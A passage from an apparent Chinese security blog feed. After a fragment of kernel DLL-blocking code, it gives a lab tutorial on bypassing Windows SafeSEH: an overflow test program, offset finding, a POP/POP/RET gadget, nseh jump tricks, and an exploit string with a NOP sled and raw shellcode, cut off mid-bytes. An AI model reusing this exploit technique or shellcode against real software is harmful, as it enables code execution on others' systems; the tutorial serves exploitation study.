(PULONG)&amp;Count</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">// Count中是dll的总数</span></span><br><span class="line">        <span class="built_in">RtlFreeUnicodeString</span>(&amp;v4);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((Count &lt; <span class="number">0</span>) ||</span><br><span class="line">            (Count &gt; DLL_MAX_COUNT))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 先释放之前的结构</span></span><br><span class="line">        <span class="keyword">if</span> (__AntiLoadDll != <span class="literal">NULL</span>)   <span class="comment">//二维指针  [int]【】【】【】【】【】【】</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeBuffer</span>((PVOID)__AntiLoadDll);</span><br><span class="line">            __AntiLoadDll = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ViewSize = Count * <span class="built_in">sizeof</span>(ANTI_LOAD_DLL_ENTRY) + <span class="built_in">sizeof</span>(<span class="type">int</span>);</span><br><span class="line">        __AntiLoadDll = (PANTI_LOAD_DLL)<span class="built_in">AllocateBuffer</span>(ViewSize);</span><br><span class="line">        <span class="keyword">if</span> (__AntiLoadDll == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(__AntiLoadDll, ViewSize);</span><br><span class="line"></span><br><span class="line">        __AntiLoadDll-&gt;Count = Count;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="comment">// 遍历所有数量</span></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(Key, <span class="built_in">sizeof</span>(Key));</span><br><span class="line">            <span class="comment">// key变为“i=”格式</span></span><br><span class="line">            Status = <span class="built_in">RtlStringCchPrintfA</span>(</span><br><span class="line">                Key,</span><br><span class="line">                <span class="number">32</span>,</span><br><span class="line">                <span class="string">&quot;%d=&quot;</span>,</span><br><span class="line">                i + <span class="number">1</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">//Key[32]  &quot;1=&quot; </span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//Count=100,     1= 查找位置</span></span><br><span class="line">            v2 = <span class="built_in">strstr</span>(v1, Key);</span><br><span class="line">            <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">// 移动指针，查找分号位置</span></span><br><span class="line">            v1 = v2;</span><br><span class="line">            v2 = <span class="built_in">strstr</span>(v1, SEPARATE_NAME);</span><br><span class="line">            <span class="keyword">if</span> (v2 == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">   <span class="comment">// 移动指针过key</span></span><br><span class="line">            v1 += <span class="built_in">strlen</span>(Key);</span><br><span class="line">            <span class="comment">// 验证指针不超过;</span></span><br><span class="line">            <span class="keyword">if</span> ((v2 &lt;= v1) ||</span><br><span class="line">                (v2 - v1 &gt;= DLL_HASH_COUNT))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// 取出等号后的KeyValue</span></span><br><span class="line">            <span class="built_in">RtlZeroMemory</span>(KeyValue, <span class="built_in">sizeof</span>(KeyValue));</span><br><span class="line">            <span class="built_in">RtlCopyMemory</span>(KeyValue, v1, v2 - v1);</span><br><span class="line">            <span class="built_in">RtlInitAnsiString</span>(&amp;v3, KeyValue);</span><br><span class="line">            Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(</span><br><span class="line">                &amp;v4,</span><br><span class="line">                &amp;v3,</span><br><span class="line">                TRUE</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// KeyValue即是文件hash，取到结构中</span></span><br><span class="line">            PathHash = <span class="number">0</span>;</span><br><span class="line">            Status = <span class="built_in">RtlUnicodeStringToInteger</span>(</span><br><span class="line">                &amp;v4,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                &amp;PathHash</span><br><span class="line">            );</span><br><span class="line">            <span class="built_in">RtlFreeUnicodeString</span>(&amp;v4);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status) || (PathHash &lt;= <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            __AntiLoadDll-&gt;Entry[i].PathHash = PathHash;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IsOk = TRUE;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>突破SafeSEH</title>
      <link href="/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/"/>
      <url>/2024/03/09/%E7%AA%81%E7%A0%B4SafeSEH/</url>
      
        <content type="html"><![CDATA[<h1 id="突破safeSeh"><a href="#突破safeSeh" class="headerlink" title="突破safeSeh"></a>突破safeSeh</h1><p>设计SafeSEH保护机制的目的，以为了防止那种攻击者通过覆盖堆栈上的异常处理函数句柄，从而控制程序执行流程的攻击。自Windwos XP SP2之后，微软就已经引入了SafeSEH技术。不过由于SafeSEH需要编译器在编译PE文件时进行特殊支持才能发挥作用，而xp sp2下的系统文件基本都是不支持SafeSEH的编译器编译的，因此在xpsp2下，SafeSEH还没有发挥作用（VS2003及更高版本的编译器中已经开始支持）。从Vista开始，由于系统PE文件基本都是由支持SafeSEH的编译器编译的，因此从Vista开始，SafeSEH开始发挥他强大的作用，对于以前那种简单的通过覆盖异常处理句柄的漏洞利用技术，也就基本失效了。</p><p>SafeSEH的基本原理很简单，即在调用异常处理函数之前，对要调用的异常处理函数进行一系列的有效性校验，如果发现异常处理函数不可靠（被覆盖了，被篡改了），立即终止异常处理函数的调用</p><p>对于目前的大部分windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用，比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。如图</p><p><img src="/.io//image-20240212235650863.png" alt="image-20240212235650863"></p><p>由上图可以看到test1.exe未受到SafeSeh保护。</p><ol><li>在Exploit 中不利用 SEH（而是通过覆盖返回地址的方法来利用，前提是模块没有GS保护）</li><li>如果程序编译的时候没有启用 safeseh 并且至少存在一个没启用 safeseh 的加载模块（系统模块或程序 私有模块）。这样就可以用这些模块中的 pop&#x2F;pop&#x2F;ret 指令地址来绕过保护。test1.exe程序没有启用SafeSeh，所以我们仍然可以利用这两个模块的指令地址绕过SafeSeh。</li><li>如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，应用程序被加载 的地址有 NULL 字节，如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址（NULL 字节会是最后 一个字节），但是你不能把 shellcode 放在异常处理器之后（因为这样 shellcode 将不会被拷贝到内存中 – NULL 是字符串终止符）</li></ol><p><strong>实战当只有应用程序本身没有开启SafeSeh时如何绕过SafeSeh技术</strong></p><p>原理：如果只有应用程序没有启用 safeseh 保护机制，在特定条件下，你依然可以成功利用，尽管应用程序被加载的地址有 NULL 字节【应用程序加载的地址一般是0x00开头】，但如果在程序中找到了 pop&#x2F;pop&#x2F;ret 指令，你可以使用这个地址覆盖SE Handler（NULL 字节会是最后 一个字节）。我们可以把shellcode放到Pointer to next SEH record的前面，在Pointer to next SEH record加一个跳到shellcode的跳转，所以我们可以直接忽视0x00截断问题。</p><p>当所有系统的模块都开启了SafeSeh，而我们又不得不利用SafeSeh时，我们希望程序本身没有没有SafeSeh，幸运的是，这种情况非常常见。为了方便演示这种技术，使用下面的代码：</p><p>关闭DEP，SafeSeh选项</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> temp[<span class="number">2048</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">test</span>(<span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面计算多少字符能够覆盖到默认SEH 。用Immunity Debugger产生10000个随机字符序列：</p><p><img src="/.io//image-20240213000454902.png" alt="image-20240213000454902"></p><p>找到这个pattern.txt，用这个10000个字符替换test(“AAAA”); 中AAAA。然后重新编译。</p><p>用Windbg载入，执行两次 g，然后 !exchain。如图</p><p><img src="/.io//image-20240213000403059.png" alt="image-20240213000403059"></p><p>!exchain查询异常信息，可以看到，nseh【注：下文提到的nseh为Pointer to next SEH record，n是next的意思。Nseh是指向下一个异常处理结构的指针，seh是异常处理函数的指针。】已经被覆盖为0x62443961(bD9a)，回到Immunity Debugger，执行!mona po bD9a。</p><p><img src="/.io//image-20240213000444080.png" alt="image-20240213000444080"></p><p> 2368字节可以覆盖到nseh。我们可以验证一下，改为test(“AAAAAAAAAAAAAAAAA……”);  里面是2368个A。重新编译，用Immunity Debugger载入，直接运行</p><p><img src="/.io//image-20240213000622376.png" alt="image-20240213000622376"></p><p>刚好能覆盖到nseh。下面就是在应用程序的模块找pop pop retn序列地址。我们不能在系统dll模块找，因为它们有SafeSeh保护，将导致我们的shellcode执行失败。 我用Immunity Debugger的搜索功能 r32是模糊匹配32位寄存器。</p><p>为什么要找这样一个地址？<a href="https://blog.csdn.net/youb11/article/details/45113011">为什么POP&#x2F;POP&#x2F;RET是必需的_pop ret-CSDN博客</a></p><p><a href="https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/">https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/</a></p><p><img src="/.io//image-20240213001131067.png" alt="image-20240213001131067"></p><p>幸运的是pop pop retn这种指令很多，很快，在0x00401231找到了一个</p><p>   00401231  . 59       POP ECX</p><p>   00401232  . 59       POP ECX</p><p>   00401233  . C3       RETN</p><p>   下面就是构造溢出字符串：</p><p>   buf + nseh + Nseh + nops + shellcode,其中Next SEH：放置Shellcode地址  SEH handle：放置“POP POP RET”操作函数的地址</p><p>pop pop retn指令地址0x00401231有截断字符\00。会导致后面的shellcode被截断。我们得想办法解决：那么把shellcode放前面，在seh后面加一个跳转跳到我们的shellcode？你也许觉得可以。其实，这不行，因为seh后面都被截断了，无法在seh后面放跳转指令跳到shellcode。但是，注意到程序在执行pop pop retn后会跟踪执行nseh指令，而nseh在seh前面，不会被截断。因此我们可以在nseh跳到shellcode。把shellcode布置到nseh前面的buf中。由前面我们知道，2368个字符可以覆盖到nseh，我们在其中放置shellcode，不足的用\x90填充。我看了下我们shellcode长度是194字节，所以我们可以把shellcode布置在nseh前的194字节处，shellcode前面用\x90填充。那么nseh这里应该是跳到前面的shellcode的指令</p><p>我们可以用Immunity Debugger。转到nseh所在地址0x0018FF78。按空格键，在这一行反汇编：jmp 0x0018FEB8 (shellcode地址)</p><p>然而我发现这不行，我们nseh只能放四个字节长的指令，jmp 0x0018FEB8指令五字节。但我们还有解决的办法：把shellcode在往上移动八个字节，在nseh前面就空出了八个字节，在这里放置跳转到shellcode的地址，nseh放置跳转到那八个字节。继续，shellcode往上移动八个字节就到了0x0018FEB0处，nseh跳到它前面的把个字节0x0018FF70处。</p><p>所以nseh应该放置0x9090F6EB，用同样的办法</p><p>Nseh前面的八个字节应该放0x909090FFFFFF39E9。构造的Exploit如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">test</span><span class="params">(<span class="type">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">          <span class="built_in">strcpy</span>(buffer,str);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line"></span><br><span class="line">          <span class="type">char</span> temp[<span class="number">2048</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>(<span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x57\x69\x6e\x45\x75\xf2\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x4b\x33\x6e\x01\x68\x20\x42\x72\x6f\x68\x2f\x41\x44\x44\x68\x6f\x